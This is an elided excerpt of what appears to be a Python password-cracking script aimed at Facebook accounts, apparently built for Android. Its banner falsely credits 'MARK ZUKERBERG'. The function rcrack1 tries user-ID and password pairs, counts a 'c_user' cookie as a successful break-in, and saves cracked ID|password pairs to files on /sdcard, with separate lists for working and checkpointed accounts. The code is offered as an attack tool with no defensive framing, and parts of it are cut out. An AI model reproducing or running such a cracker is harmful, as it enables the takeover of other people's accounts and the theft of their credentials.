...
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MARK ZUKERBERG
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mZUKU-CYBER-404
...
def rcrack1(uid,pwx,tl):
    ...
    'viewport-width': '811',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f' \033[38;5;46m[ZUKU-OK] {idf} | {ps}')
                open('/sdcard/ZUKU-OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
                ...
                idf = "1000"+coki1[0:11]
                print(f' \033[1;31m[ZUKU-CP] {idf} | {ps}' ' \n\033[1;33m [🍎] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/ZUKU-CP','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
